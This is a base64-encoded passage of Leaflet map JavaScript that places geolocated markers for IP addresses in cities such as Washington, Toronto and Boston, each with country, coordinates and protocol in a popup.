eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMjM5LjIyMC4zMjxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfMDNlOGM5NDgxODcxNDRiYTlmNmI3MTlmMzBlNjAzNDcuc2V0Q29udGVudChodG1sXzAwY2U3ZWJkYTE5MDRjNjk5YzE5OGVhMzM3ODhjYjZkKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNWU0ZjI3NDY4Mjk4NGEzN2E5MDM0ZGJkYjRjOTFmMTQuYmluZFBvcHVwKHBvcHVwXzAzZThjOTQ4MTg3MTQ0YmE5ZjZiNzE5ZjMwZTYwMzQ3KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl81ZTRmMjc0NjgyOTg0YTM3YTkwMzRkYmRiNGM5MWYxNC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzE2MzI1ZjIzMDQwZDRmOGViYTZmMjI0ZmU2MmI2M2RjID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzc4OTViMWU1ZmQzMTRmN2RhODYzYmNjYzNjNWFiNmRkID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzE2MzI1ZjIzMDQwZDRmOGViYTZmMjI0ZmU2MmI2M2RjLnNldEljb24oaWNvbl83ODk1YjFlNWZkMzE0ZjdkYTg2M2JjY2MzYzVhYjZkZCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9iNzQyOGM2OGQ1MTY0N2NiYmRmMTQzMjQwODgwNjM2OCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzEyYmFiNTk5YTA2ODRiY2U5ODcxMTZmM2Q1ZTIyNDhkID0gJChgPGRpdiBpZD0iaHRtbF8xMmJhYjU5OWEwNjg0YmNlOTg3MTE2ZjNkNWUyMjQ4ZCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuODguMjU1LjExNTxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfYjc0MjhjNjhkNTE2NDdjYmJkZjE0MzI0MDg4MDYzNjguc2V0Q29udGVudChodG1sXzEyYmFiNTk5YTA2ODRiY2U5ODcxMTZmM2Q1ZTIyNDhkKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMTYzMjVmMjMwNDBkNGY4ZWJhNmYyMjRmZTYyYjYzZGMuYmluZFBvcHVwKHBvcHVwX2I3NDI4YzY4ZDUxNjQ3Y2JiZGYxNDMyNDA4ODA2MzY4KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8xNjMyNWYyMzA0MGQ0ZjhlYmE2ZjIyNGZlNjJiNjNkYy5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMGY5YmZkZTRhMjgxNGQ5ZTlkZjdkYWM2Y2Y2MDRhYWUgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMTEwMTMyNTUzZGNlNDAzNzhiZWM0MTNiNTBkZmY5ZGMgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMGY5YmZkZTRhMjgxNGQ5ZTlkZjdkYWM2Y2Y2MDRhYWUuc2V0SWNvbihpY29uXzExMDEzMjU1M2RjZTQwMzc4YmVjNDEzYjUwZGZmOWRjKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzE2ODI2ZjNiYjdiMDQyNjBhZWIzYzhmNTYwMGE5YWQxID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMzYyZjZjM2M1YWU5NDA4NGJkNGJlOTgzYTNiMzRjZDAgPSAkKGA8ZGl2IGlkPSJodG1sXzM2MmY2YzNjNWFlOTQwODRiZDRiZTk4M2EzYjM0Y2QwIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIzOS4yMjAuNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzE2ODI2ZjNiYjdiMDQyNjBhZWIzYzhmNTYwMGE5YWQxLnNldENvbnRlbnQoaHRtbF8zNjJmNmMzYzVhZTk0MDg0YmQ0YmU5ODNhM2IzNGNkMCk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzBmOWJmZGU0YTI4MTRkOWU5ZGY3ZGFjNmNmNjA0YWFlLmJpbmRQb3B1cChwb3B1cF8xNjgyNmYzYmI3YjA0MjYwYWViM2M4ZjU2MDBhOWFkMSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMGY5YmZkZTRhMjgxNGQ5ZTlkZjdkYWM2Y2Y2MDRhYWUuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl8zZDc1ZGUzZDUzNTY0MTFlOGMwYjFhZTU5NzdkZDYzZiA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9kMzk4MTk2YjI2N2M0OWE0ODk4ZGVmNWIxMDQ3ZDIwNiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8zZDc1ZGUzZDUzNTY0MTFlOGMwYjFhZTU5NzdkZDYzZi5zZXRJY29uKGljb25fZDM5ODE5NmIyNjdjNDlhNDg5OGRlZjViMTA0N2QyMDYpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZjQxZGQ1YWQwYjRhNDQ1OWFmNjQwNDJhMzRhMDI3MzAgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF85MDBiOGVlZWRjMmQ0MzEzYTUxMWRjNWFiMzA0ZjNjMiA9ICQoYDxkaXYgaWQ9Imh0bWxfOTAwYjhlZWVkYzJkNDMxM2E1MTFkYzVhYjMwNGYzYzIiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMTY4LjUwLjc5PGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2Y0MWRkNWFkMGI0YTQ0NTlhZjY0MDQyYTM0YTAyNzMwLnNldENvbnRlbnQoaHRtbF85MDBiOGVlZWRjMmQ0MzEzYTUxMWRjNWFiMzA0ZjNjMik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzNkNzVkZTNkNTM1NjQxMWU4YzBiMWFlNTk3N2RkNjNmLmJpbmRQb3B1cChwb3B1cF9mNDFkZDVhZDBiNGE0NDU5YWY2NDA0MmEzNGEwMjczMCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfM2Q3NWRlM2Q1MzU2NDExZThjMGIxYWU1OTc3ZGQ2M2YuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2M1ZDc4MmNhMzJiZjQ3MDE5YWY0YzY5NDhmNWE5Y2E3ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzFjM2Q3ZWI2MTdkZDRjY2E4Zjg3ZTQ1N2VkNGFkNmExID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2M1ZDc4MmNhMzJiZjQ3MDE5YWY0YzY5NDhmNWE5Y2E3LnNldEljb24oaWNvbl8xYzNkN2ViNjE3ZGQ0Y2NhOGY4N2U0NTdlZDRhZDZhMSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF84YmQ4MWVlNGJhMzE0ZDRhYTVhNWNjODIwYjEyM2QwMSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzIyZjM2MGNkNmIxOTRlZmE4ZDY5YmI5YjYwZTkwZDE4ID0gJChgPGRpdiBpZD0iaHRtbF8yMmYzNjBjZDZiMTk0ZWZhOGQ2OWJiOWI2MGU5MGQxOCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+NDAuODUuMjMyLjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF84YmQ4MWVlNGJhMzE0ZDRhYTVhNWNjODIwYjEyM2QwMS5zZXRDb250ZW50KGh0bWxfMjJmMzYwY2Q2YjE5NGVmYThkNjliYjliNjBlOTBkMTgpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9jNWQ3ODJjYTMyYmY0NzAxOWFmNGM2OTQ4ZjVhOWNhNy5iaW5kUG9wdXAocG9wdXBfOGJkODFlZTRiYTMxNGQ0YWE1YTVjYzgyMGIxMjNkMDEpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2M1ZDc4MmNhMzJiZjQ3MDE5YWY0YzY5NDhmNWE5Y2E3LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9iNzEyYTk0OGE3ZGY0YTdiYmZhZWEyNzY4MjVmOTA4NSA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9lMjQ5Y2U3YmI2NjI0MzJkOTJhZGIwNTM0MTM4MTE0ZSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9iNzEyYTk0OGE3ZGY0YTdiYmZhZWEyNzY4MjVmOTA4NS5zZXRJY29uKGljb25fZTI0OWNlN2JiNjYyNDMyZDkyYWRiMDUzNDEzODExNGUpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNjdhMTBlZjkzMTA5NDlkYjg3NjBmODUyMjA3MmFmZGMgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9hMGRiY2UzYTdiYzU0M2ZhOWU0YjJkNWNhMzE2ZWM5NiA9ICQoYDxkaXYgaWQ9Imh0bWxfYTBkYmNlM2E3YmM1NDNmYTllNGIyZDVjYTMxNmVjOTYiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjQwLjg1LjIzMi42NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNjdhMTBlZjkzMTA5NDlkYjg3NjBmODUyMjA3MmFmZGMuc2V0Q29udGVudChodG1sX2EwZGJjZTNhN2JjNTQzZmE5ZTRiMmQ1Y2EzMTZlYzk2KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfYjcxMmE5NDhhN2RmNGE3YmJmYWVhMjc2ODI1ZjkwODUuYmluZFBvcHVwKHBvcHVwXzY3YTEwZWY5MzEwOTQ5ZGI4NzYwZjg1MjIwNzJhZmRjKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9iNzEyYTk0OGE3ZGY0YTdiYmZhZWEyNzY4MjVmOTA4NS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMjEzMjQwOWNjNzdmNDI0MjkxY2ExOGVmOTZlZmIwZjcgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fNzdjYzkxYmI2MmI3NGVmOWE2NDFhZTYxMGE5ZDE0NWYgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMjEzMjQwOWNjNzdmNDI0MjkxY2ExOGVmOTZlZmIwZjcuc2V0SWNvbihpY29uXzc3Y2M5MWJiNjJiNzRlZjlhNjQxYWU2MTBhOWQxNDVmKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2M2MmUwYzZkYTFlYjQwNzQ4YTFlZDQ0ZGMxNjZhYmJlID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfOTE3OWQwMGU3MzBiNDliY2FlMzdhNThiNmQ3MmVkYmMgPSAkKGA8ZGl2IGlkPSJodG1sXzkxNzlkMDBlNzMwYjQ5YmNhZTM3YTU4YjZkNzJlZGJjIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj4xMy44OC4yNTUuMTE1PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9jNjJlMGM2ZGExZWI0MDc0OGExZWQ0NGRjMTY2YWJiZS5zZXRDb250ZW50KGh0bWxfOTE3OWQwMGU3MzBiNDliY2FlMzdhNThiNmQ3MmVkYmMpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl8yMTMyNDA5Y2M3N2Y0MjQyOTFjYTE4ZWY5NmVmYjBmNy5iaW5kUG9wdXAocG9wdXBfYzYyZTBjNmRhMWViNDA3NDhhMWVkNDRkYzE2NmFiYmUpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzIxMzI0MDljYzc3ZjQyNDI5MWNhMThlZjk2ZWZiMGY3LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9mYmUxNDhmY2E4ZGI0MGVlOWE2MjI3NmY1M2M4ZmI1MiA9IEwubWFya2VyKAogICAgICAgICAgICBbNDIuMzU4NCwgLTcxLjA1OThdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl84ZDkyN2I5M2E3ZWM0Mjc1YTk2MzA0Yzg5ODJmOTg3ZiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9mYmUxNDhmY2E4ZGI0MGVlOWE2MjI3NmY1M2M4ZmI1Mi5zZXRJY29uKGljb25fOGQ5MjdiOTNhN2VjNDI3NWE5NjMwNGM4OTgyZjk4N2YpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfODIxMjliMjQwMWJiNDg4NzlhMjZhYWUzNTM3MWQ1MzcgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF80YjBkNzYxODc2MjY0Mzg1OWQyZmZhYjlmYTZhMTdiZiA9ICQoYDxkaXYgaWQ9Imh0bWxfNGIwZDc2MTg3NjI2NDM4NTlkMmZmYWI5ZmE2YTE3YmYiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1NYXNzYWNodXNldHRzLCBDaXR5PUJvc3RvbiwgTG9uZ2l0dWRlPS03MS4wNTk4LCBMYXRpdHVkZT00Mi4zNTg0PGJyPjkxLjE4OS45MS4yNjxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF84MjEyOWIyNDAxYmI0ODg3OWEyNmFhZTM1MzcxZDUzNy5zZXRDb250ZW50KGh0bWxfNGIwZDc2MTg3NjI2NDM4NTlkMmZmYWI5ZmE2YTE3YmYpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9mYmUxNDhmY2E4ZGI0MGVlOWE2MjI3NmY1M2M4ZmI1Mi5iaW5kUG9wdXAocG9wdXBfODIxMjliMjQwMWJiNDg4NzlhMjZhYWUzNTM3MWQ1MzcpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2ZiZTE0OGZjYThkYjQwZWU5YTYyMjc2ZjUzYzhmYjUyLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYEJvc3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzJlMTdlMTY1YmJlNTQ1ZDY5YTVlNzg3NWEzZmEzMWU2ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0Ny42NzQsIC0xMjIuMTIxNV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2VkNTE2OWIxNjc4OTQ4MzNiZDUzNmI5YTNlYjExNzFlID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzJlMTdlMTY1YmJlNTQ1ZDY5YTVlNzg3NWEzZmEzMWU2L